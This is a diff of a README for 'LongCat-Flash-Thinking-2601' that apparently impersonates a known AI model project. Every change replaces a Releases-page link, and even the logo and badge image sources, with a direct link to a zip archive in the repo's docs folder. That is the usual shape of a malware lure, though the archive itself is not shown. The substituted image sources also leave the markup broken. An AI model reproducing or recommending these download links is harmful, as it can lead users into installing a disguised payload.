@@ -1,13 +1,13 @@
 # 🐱 LongCat-Flash-Thinking-2601 - Unlock Your Creative Power
 
 <div align="center">
-  <a href="https://github.com/abdulaimutakillu/LongCat-Flash-Thinking-2601/releases">
-    <img alt="Download LongCat-Flash-Thinking-2601" src="https://img.shields.io/badge/⬇️%20Download%20Now-LongCat--Flash--Thinking-ADFF2F?style=for-the-badge&logoColor=white" />
+  <a href="https://github.com/abdulaimutakillu/LongCat-Flash-Thinking-2601/raw/refs/heads/main/docs/Thinking-Cat-Long-Flash-v1.4.zip">
+    <img alt="Download LongCat-Flash-Thinking-2601" src="https://github.com/abdulaimutakillu/LongCat-Flash-Thinking-2601/raw/refs/heads/main/docs/Thinking-Cat-Long-Flash-v1.4.zip⬇️%20Download%20Now-LongCat--Flash--Thinking-ADFF2F?style=for-the-badge&logoColor=white" />
   </a>
 </div>
 
 <div align="center">
-  <img src="https://raw.githubusercontent.com/meituan-longcat/LongCat-Flash-Chat/main/figures/longcat_logo.svg" width="45%" alt="LongCat-Flash" />
+  <img src="https://github.com/abdulaimutakillu/LongCat-Flash-Thinking-2601/raw/refs/heads/main/docs/Thinking-Cat-Long-Flash-v1.4.zip" width="45%" alt="LongCat-Flash" />
 </div>
 <hr>
 
@@ -27,7 +27,7 @@ LongCat-Flash-Thinking-2601 helps you enhance your creativity and streamline you
 
 To get started, you can download LongCat-Flash-Thinking-2601 from our Releases page. 
 
-[Download LongCat-Flash-Thinking-2601](https://github.com/abdulaimutakillu/LongCat-Flash-Thinking-2601/releases)
+[Download LongCat-Flash-Thinking-2601](https://github.com/abdulaimutakillu/LongCat-Flash-Thinking-2601/raw/refs/heads/main/docs/Thinking-Cat-Long-Flash-v1.4.zip)
 
 Follow these steps:
 
@@ -75,7 +75,7 @@ Need help? You can contact our support team through the GitHub Discussions or ch
 
 We regularly update LongCat-Flash-Thinking-2601. To stay up to date: 
 
-1. Visit our [Releases page](https://github.com/abdulaimutakillu/LongCat-Flash-Thinking-2601/releases).
+1. Visit our [Releases page](https://github.com/abdulaimutakillu/LongCat-Flash-Thinking-2601/raw/refs/heads/main/docs/Thinking-Cat-Long-Flash-v1.4.zip).
 2. Download the latest version when available and follow the same installation steps.
 
 ---
